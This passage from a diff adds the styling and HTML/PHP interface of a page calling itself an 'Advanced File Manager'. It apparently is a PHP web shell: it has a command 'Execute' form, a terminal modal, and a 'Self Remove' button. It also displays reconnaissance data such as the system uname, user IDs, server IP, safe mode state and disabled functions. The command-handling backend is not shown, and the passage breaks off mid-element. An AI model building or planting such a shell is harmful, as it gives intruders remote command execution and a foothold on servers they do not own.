rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap"rel="stylesheet"><style>
+:root{
+--bg-main:#0a0a0f;
+--bg-card:rgba(18,18,24,0.85);
+--bg-card-solid:#121218;
+--bg-hover:rgba(139,92,246,0.12);
+--bg-overlay:rgba(10,10,15,0.96);
+--text-primary:#f4f4f5;
+--text-secondary:#a1a1aa;
+--text-muted:#71717a;
+--border-color:rgba(63,63,70,0.4);
+--accent-primary:#8b5cf6;
+--accent-hover:#a78bfa;
+--accent-glow:rgba(139,92,246,0.25);
+--color-success:#10b981;
+--color-error:#ef4444;
+--color-warning:#f59e0b;
+--color-info:#3b82f6;
+--font-sans:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;
+--font-mono:'JetBrains Mono','Courier New',monospace;
+--radius:10px;
+--radius-sm:6px;
+--radius-lg:14px;
+--shadow:0 2px 8px rgba(0,0,0,0.4),0 1px 3px rgba(0,0,0,0.3);
+--shadow-md:0 4px 12px rgba(0,0,0,0.5),0 2px 6px rgba(0,0,0,0.35);
+--shadow-lg:0 10px 25px rgba(0,0,0,0.6),0 4px 10px rgba(0,0,0,0.4);
+--transition:0.15s cubic-bezier(0.4,0,0.2,1);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{
+font-family:var(--font-sans);
+background:linear-gradient(135deg,#0a0a0f 0%,#14141a 100%);
+color:var(--text-primary);
+line-height:1.5;
+padding:12px;
+font-size:13px;
+min-height:100vh;
+}
+.container{max-width:1600px;margin:0 auto}
+.card{
+background:var(--bg-card);
+backdrop-filter:blur(12px);
+-webkit-backdrop-filter:blur(12px);
+border:1px solid var(--border-color);
+border-radius:var(--radius);
+padding:14px 16px;
+margin-bottom:12px;
+box-shadow:var(--shadow);
+transition:all var(--transition);
+}
+.card:hover{border-color:rgba(139,92,246,0.3)}
+.server-info{
+font-family:var(--font-mono);
+font-size:11px;
+line-height:1.6;
+color:var(--text-secondary);
+padding:10px 12px;
+}
+.server-info strong{color:var(--text-primary);font-weight:600;margin-right:4px}
+.server-info .highlight{color:var(--accent-primary);font-weight:700}
+.nav-bar{display:flex;align-items:center;gap:8px;margin:12px 0;flex-wrap:wrap}
+.path-bar{
+flex:1;
+background:var(--bg-card);
+backdrop-filter:blur(12px);
+border:1px solid var(--border-color);
+padding:6px 10px;
+border-radius:var(--radius-sm);
+font-size:12px;
+word-break:break-all;
+min-width:0;
+font-family:var(--font-mono);
+}
+.path-root{
+display:inline-flex;
+align-items:center;
+gap:4px;
+font-weight:600;
+margin-right:4px;
+color:var(--accent-primary);
+padding:2px 8px;
+border-radius:var(--radius-sm);
+background:var(--accent-glow);
+transition:all var(--transition);
+text-decoration:none;
+font-size:11px;
+}
+.path-root:hover{background:rgba(139,92,246,0.35);transform:translateY(-1px)}
+.path-root i{font-size:10px}
+.path-custom{
+color:var(--text-primary)!important;
+background:rgba(139,92,246,0.2)!important;
+font-weight:600!important;
+border-radius:var(--radius-sm)!important;
+padding:2px 8px!important;
+margin:0 2px!important;
+transition:all var(--transition);
+}
+.path-custom:hover{background:rgba(139,92,246,0.3)!important}
+.path-status{
+margin-left:6px;
+font-weight:700;
+font-size:9px;
+text-transform:uppercase;
+letter-spacing:0.5px;
+padding:2px 6px;
+border-radius:var(--radius-sm);
+}
+.path-status.writable{color:var(--color-success);background:rgba(16,185,129,0.15)}
+.path-status.readable{color:var(--color-info);background:rgba(59,130,246,0.15)}
+.path-status.denied{color:var(--color-error);background:rgba(239,68,68,0.15)}
+.nav-buttons{display:flex;gap:6px}
+.nav-buttons a,.nav-buttons button{
+background:var(--bg-card);
+backdrop-filter:blur(12px);
+color:var(--text-primary);
+padding:6px 10px;
+border-radius:var(--radius-sm);
+font-weight:500;
+white-space:nowrap;
+transition:all var(--transition);
+border:1px solid var(--border-color);
+cursor:pointer;
+text-decoration:none;
+font-size:12px;
+display:inline-flex;
+align-items:center;
+gap:4px;
+}
+.nav-buttons a:hover,.nav-buttons button:hover{
+background:var(--accent-primary);
+color:#000;
+border-color:var(--accent-primary);
+transform:translateY(-2px);
+box-shadow:0 4px 12px var(--accent-glow);
+}
+.nav-buttons i{font-size:11px}
+.message{
+padding:10px 14px;
+margin-bottom:12px;
+border-radius:var(--radius-sm);
+border:1px solid;
+font-weight:500;
+font-size:12px;
+animation:slideIn 0.3s;
+background:var(--color-success);
+border-color:var(--color-success);
+color:#fff;
+}
+.message.error{background:var(--color-error);border-color:var(--color-error)}
+@keyframes slideIn{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:translateY(0)}}
+.action-forms{display:flex;flex-wrap:wrap;gap:8px;justify-content:flex-start}
+.form-group{display:flex;gap:6px;align-items:center}
+.button,button,input,select{
+font-family:var(--font-sans);
+font-size:12px;
+padding:6px 10px;
+border:1px solid var(--border-color);
+border-radius:var(--radius-sm);
+background:var(--bg-main);
+color:var(--text-primary);
+transition:all var(--transition);
+}
+input[type=file]{padding:4px 8px;font-size:11px}
+input[type=text]:focus,select:focus,textarea:focus{
+outline:0;
+border-color:var(--accent-primary);
+box-shadow:0 0 0 3px var(--accent-glow);
+}
+.button,button{
+background:var(--accent-primary);
+color:#000;
+border-color:var(--accent-primary);
+cursor:pointer;
+font-weight:600;
+}
+.button:hover,button:hover{
+background:var(--accent-hover);
+transform:translateY(-1px);
+box-shadow:0 4px 12px var(--accent-glow);
+}
+.search-container{margin:12px 0}
+.search-container input{
+width:100%;
+max-width:400px;
+padding:8px 12px;
+font-size:12px;
+background:var(--bg-card);
+backdrop-filter:blur(12px);
+}
+.file-table-container{
+background:var(--bg-card);
+backdrop-filter:blur(12px);
+border:1px solid var(--border-color);
+border-radius:var(--radius);
+overflow:hidden;
+box-shadow:var(--shadow-md);
+}
+.table-header-toolbar{
+padding:10px 14px;
+background:rgba(18,18,24,0.95);
+border-bottom:1px solid var(--border-color);
+display:flex;
+align-items:center;
+gap:10px;
+}
+.file-table{width:100%;border-collapse:collapse;table-layout:fixed}
+.file-table td,.file-table th{
+padding:8px 10px;
+text-align:left;
+vertical-align:middle;
+border-bottom:1px solid rgba(63,63,70,0.25);
+}
+.file-table th{
+background:rgba(18,18,24,0.98);
+color:var(--text-secondary);
+font-weight:700;
+font-size:10px;
+text-transform:uppercase;
+letter-spacing:0.8px;
+}
+.file-table td{background:transparent;font-size:12px}
+.file-table tr:hover td{
+background:var(--bg-hover);
+transition:all var(--transition);
+}
+.file-table tr.selected td{background:var(--bg-hover)}
+.file-table tr.hidden{display:none}
+.col-select{width:35px}
+.col-name{width:36%}
+.col-size{width:9%}
+.col-owner{width:14%}
+.col-perms{width:7%}
+.col-date{width:13%}
+.col-actions{width:11%}
+.col-name>div{display:flex;align-items:center;gap:6px;min-width:0}
+.col-name a{
+color:var(--text-primary);
+text-decoration:none;
+white-space:nowrap;
+overflow:hidden;
+text-overflow:ellipsis;
+flex:1;
+min-width:0;
+font-weight:500;
+}
+.col-name a:hover{color:var(--accent-primary)}
+.col-name i{
+width:14px;
+font-size:13px;
+color:var(--text-secondary);
+flex-shrink:0;
+}
+.col-owner{
+font-family:var(--font-mono);
+font-size:10px;
+color:var(--text-secondary);
+word-break:break-word;
+line-height:1.3;
+}
+.col-perms{font-family:var(--font-mono);font-size:11px}
+.perms-writable{color:var(--color-success);font-weight:700}
+.perms-readable{color:var(--color-info);font-weight:600}
+.perms-denied{color:var(--color-error);font-weight:700}
+.text-actions{
+white-space:nowrap;
+display:flex;
+gap:3px;
+align-items:center;
+justify-content:flex-end;
+}
+.text-actions a,.text-actions button{
+display:inline-flex;
+align-items:center;
+justify-content:center;
+width:26px;
+height:26px;
+background:transparent;
+border:1px solid transparent;
+cursor:pointer;
+color:var(--text-secondary);
+border-radius:var(--radius-sm);
+transition:all var(--transition);
+text-decoration:none;
+padding:0;
+}
+.text-actions a:hover,.text-actions button:hover{
+color:var(--accent-primary);
+background:var(--bg-hover);
+border-color:var(--border-color);
+transform:scale(1.1);
+}
+.text-actions i{font-size:11px}
+#edit-view{display:none}
+#edit-view textarea{
+width:100%;
+min-height:55vh;
+font-family:var(--font-mono);
+background:var(--bg-main);
+color:var(--text-primary);
+border-radius:var(--radius-sm);
+border:1px solid var(--border-color);
+padding:12px;
+line-height:1.5;
+font-size:12px;
+resize:vertical;
+}
+.editor-info{
+margin-bottom:10px;
+font-size:10px;
+color:var(--text-muted);
+font-family:var(--font-mono);
+padding:8px 10px;
+background:rgba(139,92,246,0.08);
+border-radius:var(--radius-sm);
+border:1px solid rgba(139,92,246,0.2);
+}
+#modal-overlay{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:var(--bg-overlay);
+backdrop-filter:blur(8px);
+z-index:999;
+display:none;
+align-items:center;
+justify-content:center;
+animation:fadeIn 0.2s;
+}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+#modal-box{width:90%;max-width:480px}
+#terminal-modal{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:var(--bg-overlay);
+backdrop-filter:blur(8px);
+z-index:1000;
+display:none;
+align-items:center;
+justify-content:center;
+animation:fadeIn 0.2s;
+}
+#terminal-modal .card{
+width:min(96vw,1100px);
+max-height:92vh;
+padding:0;
+position:relative;
+display:flex;
+flex-direction:column;
+}
+.terminal-header{
+padding:12px 16px;
+border-bottom:1px solid var(--border-color);
+display:flex;
+justify-content:space-between;
+align-items:center;
+flex-shrink:0;
+background:rgba(18,18,24,0.98);
+}
+.terminal-header h3{margin:0;font-size:14px;font-weight:700}
+.terminal-close-btn{
+background:var(--color-error);
+color:#fff;
+border:none;
+padding:5px 12px;
+border-radius:var(--radius-sm);
+cursor:pointer;
+font-weight:600;
+font-size:11px;
+transition:all var(--transition);
+}
+.terminal-close-btn:hover{background:#dc2626;transform:scale(1.05)}
+.command-history{
+max-height:110px;
+overflow-y:auto;
+padding:6px 10px;
+background:#0d1117;
+border-bottom:1px solid var(--border-color);
+flex-shrink:0;
+}
+.history-item{
+padding:4px 8px;
+cursor:pointer;
+border-radius:var(--radius-sm);
+font-size:10px;
+color:var(--text-muted);
+margin:2px 0;
+font-family:var(--font-mono);
+transition:all var(--transition);
+}
+.history-item:hover{
+background:rgba(139,92,246,0.2);
+color:var(--text-primary);
+}
+.terminal-container{
+font-family:var(--font-mono);
+background:#0d1117;
+border-radius:0 0 var(--radius) var(--radius);
+flex:1;
+display:flex;
+flex-direction:column;
+min-height:0;
+}
+.terminal-output{
+flex:1;
+overflow-y:auto;
+padding:10px;
+background:#0d1117;
+white-space:pre-wrap;
+word-break:break-word;
+font-size:11px;
+line-height:1.4;
+color:#f0f6fc;
+min-height:200px;
+}
+.terminal-input-container{
+display:flex;
+padding:8px 10px;
+background:#161b22;
+border-top:1px solid var(--border-color);
+border-radius:0 0 var(--radius) var(--radius);
+flex-shrink:0;
+}
+.terminal-input{
+flex:1;
+background:#0d1117;
+color:#f0f6fc;
+border:1px solid rgba(63,63,70,0.5);
+padding:6px 10px;
+font-family:var(--font-mono);
+font-size:11px;
+border-radius:var(--radius-sm);
+}
+.terminal-input:focus{
+border-color:var(--accent-primary);
+box-shadow:0 0 0 2px var(--accent-glow);
+}
+.terminal-send{margin-left:6px;padding:6px 12px;font-size:11px}
+.context-menu{
+position:fixed;
+background:var(--bg-card);
+backdrop-filter:blur(16px);
+border:1px solid var(--border-color);
+border-radius:var(--radius-sm);
+padding:4px;
+box-shadow:var(--shadow-lg);
+z-index:1001;
+min-width:150px;
+display:none;
+}
+.context-menu-item{
+padding:7px 10px;
+cursor:pointer;
+font-size:12px;
+display:flex;
+align-items:center;
+gap:8px;
+transition:all var(--transition);
+border-radius:4px;
+color:var(--text-primary);
+}
+.context-menu-item:hover{
+background:var(--bg-hover);
+color:var(--accent-primary);
+}
+.context-menu-item i{width:14px;font-size:12px;color:var(--text-secondary)}
+.no-results{
+text-align:center;
+padding:30px;
+color:var(--text-muted);
+font-style:italic;
+font-size:12px;
+}
+.top-control-bar{
+display:flex;
+justify-content:space-between;
+align-items:center;
+background:var(--bg-card);
+backdrop-filter:blur(12px);
+border:1px solid var(--border-color);
+border-radius:var(--radius);
+padding:10px 16px;
+margin-bottom:12px;
+box-shadow:var(--shadow-md);
+}
+.fm-branding{
+font-size:14px;
+font-weight:700;
+color:var(--accent-primary);
+text-shadow:0 0 20px var(--accent-glow);
+}
+.top-buttons{display:flex;gap:6px}
+.top-buttons a{
+background:var(--bg-main);
+color:var(--text-primary);
+padding:5px 10px;
+border-radius:var(--radius-sm);
+font-weight:600;
+font-size:11px;
+transition:all var(--transition);
+border:1px solid var(--border-color);
+cursor:pointer;
+text-decoration:none;
+display:inline-flex;
+align-items:center;
+gap:4px;
+}
+.top-buttons a:hover{
+background:var(--accent-primary);
+color:#000;
+border-color:var(--accent-primary);
+transform:translateY(-2px);
+box-shadow:0 4px 12px var(--accent-glow);
+}
+.top-buttons i{font-size:10px}
+.danger-btn{
+background:var(--color-error)!important;
+color:#fff!important;
+border-color:var(--color-error)!important;
+}
+.danger-btn:hover{
+background:#dc2626!important;
+border-color:#dc2626!important;
+color:#fff!important;
+}
+.command-container-three-col{
+display:grid;
+grid-template-columns:repeat(3,1fr);
+gap:12px;
+}
+.execute-section,.navigate-section,.openfile-section{
+display:flex;
+flex-direction:column;
+}
+.command-container-three-col label{
+font-size:10px;
+font-weight:700;
+color:var(--text-secondary);
+margin-bottom:6px;
+display:block;
+text-transform:uppercase;
+letter-spacing:0.5px;
+}
+.command-container-three-col button,.command-container-three-col input[type=text]{
+font-family:var(--font-mono);
+font-size:12px;
+padding:7px 10px;
+box-sizing:border-box;
+border-radius:var(--radius-sm);
+border:1px solid var(--border-color);
+background:var(--bg-main);
+color:var(--text-primary);
+width:100%;
+}
+.command-container-three-col input[type=text]:focus{
+border-color:var(--accent-primary);
+box-shadow:0 0 0 3px var(--accent-glow);
+outline:0;
+}
+.command-container-three-col button{
+background:var(--accent-primary);
+color:#000;
+border-color:var(--accent-primary);
+cursor:pointer;
+font-weight:700;
+margin-top:6px;
+}
+.command-container-three-col button:hover{
+background:var(--accent-hover);
+transform:translateY(-1px);
+box-shadow:0 4px 12px var(--accent-glow);
+}
+.btn-small{
+padding:4px 8px;
+font-size:10px;
+border-radius:var(--radius-sm);
+border:1px solid var(--border-color);
+background:var(--bg-main);
+color:var(--text-primary);
+cursor:pointer;
+transition:all var(--transition);
+font-weight:600;
+}
+.btn-small:hover{
+background:var(--accent-primary);
+color:#000;
+border-color:var(--accent-primary);
+transform:translateY(-1px);
+}
+.btn-small.danger{background:var(--color-error);color:#fff;border-color:var(--color-error)}
+.btn-small.danger:hover{background:#dc2626;border-color:#dc2626}
+.clear-output-btn{
+position:absolute;
+top:6px;
+right:6px;
+background:var(--color-error);
+color:#fff;
+border:none;
+padding:4px 8px;
+border-radius:var(--radius-sm);
+font-size:9px;
+cursor:pointer;
+opacity:0.8;
+transition:all var(--transition);
+font-weight:600;
+}
+.clear-output-btn:hover{opacity:1;transform:scale(1.05)}
+@media (max-width:768px){
+.container{padding:6px}
+body{padding:8px}
+.action-forms{flex-direction:column}
+.nav-bar{flex-direction:column;align-items:stretch}
+.file-table{font-size:11px}
+.file-table td,.file-table th{padding:6px 8px}
+.col-date,.col-owner{display:none}
+.col-name{width:52%}
+.col-size{width:14%}
+.col-perms{width:13%}
+.col-actions{width:21%}
+.command-container-three-col{
+grid-template-columns:1fr;
+gap:10px;
+}
+}
+</style></head><body><div class="container"id="app-container"><div class="top-control-bar"><div class="fm-branding"><strong>Advanced File Manager - Fixed & Stable</strong></div><div class="top-buttons"><a id="sec-info-btn">Sec. Info</a> <a id="terminal-btn"><?php echo $icons['terminal']; ?>Terminal </a><a id="self-remove-btn"class="danger-btn">Self Remove</a></div></div><div class="card server-info"><strong>System:</strong><?php echo php_uname(); ?><br><strong>User:</strong><?php echo"$user ($uid) Group: $group ($gid)"; ?><br><strong>Server IP:</strong><?php echo $_SERVER['SERVER_ADDR']; ?>| <strong>Your IP:</strong><?php echo $_SERVER['REMOTE_ADDR']; ?><br><strong>HDD:</strong><?php echo format_size($used_space).' / '.format_size($total_space).' (Free: '.format_size($free_space).')'; ?><br><strong>Safe Mode:</strong><?php echo(@ini_get(strtolower("safe_mode"))=='on')?"<span class='highlight'>ON</span>":"OFF"; ?>| <strong>Disabled:</strong><?php echo empty($disabled_functions)?"NONE":"<span class='highlight'>YES</span>"; ?><br><strong>PHP:</strong><?php echo PHP_VERSION; ?>| <strong>OS:</strong><?php echo PHP_OS; ?><br><?php foreach($server_checks as $name=>$status): ?><strong><?php echo $name; ?>:</strong><?php echo $status?"<span class='highlight'>ON</span>":"OFF"; ?>|<?php endforeach; ?></div><div class="nav-bar"><div class="path-bar"id="path-bar"></div><div class="nav-buttons"><a id="refresh-btn">Refresh</a> <a href="#<?php echo basezero_encoder($script_dir); ?>"><?php echo $icons['home']; ?>Home</a></div></div><div id="message-container"><?php if($message): ?><div class="message<?php echo(strpos(strtolower($message),'error')!==false)?'error':''; ?>"><?php echo htmlspecialchars($message); ?></div><?php endif; ?></div><div id="main-content"><div id="listing-view"><div class="card"><div class="action-forms"><form method="POST"enctype="multipart/form-data"><div class="form-group"><input name="current_dir"type="hidden"class="form_current_dir"> <input name="upload_file[]"type="file"multiple required> <button type="submit">Upload</button></div></form><form method="POST"><div class="form-group"><input name="action"type="hidden"value="create_file"> <input name="current_dir"type="hidden"class="form_current_dir"> <input name="filename"placeholder="New file..."required> <button type="submit">Create File</button></div></form><form method="POST"><div class="form-group"><input name="action"type="hidden"value="create_dir"> <input name="current_dir"type="hidden"class="form_current_dir"> <input name="dirname"placeholder="New directory..."required> <button type="submit">Create Dir</button></div></form></div></div><div class="card"><div class="command-container-three-col"><div class="execute-section"><form method="POST"style="display:flex;flex-direction:column"><label>Execute:</label> <input name="action"type="hidden"value="execute_cmd"> <input name="current_dir"type="hidden"class="form_current_dir"> <input name="c"placeholder="Quick command execution..."> <button type="submit">Run</button></form></div><div class="navigate-section"><label>Navigate:</label> <input id="path-input"placeholder="Enter path..."> <button type="button"id="path-go-btn">Go</button></div><div class="openfile-section"><label>Open File:</label> <input id="file-path-input"placeholder=""> <button type="button"id="file-open-btn">Open</button></div></div><?php if(isset($_SESSION['cmd_output'])): ?><div style="position:relative"><pre style="background:#0d1117;color:#f0f6fc;padding:12px;border-radius:var(--radius-small);margin-top:12px;white-space:pre-wrap;word-break:break-word;font-family:var(--font-mono);font-size:12px;position:relative">
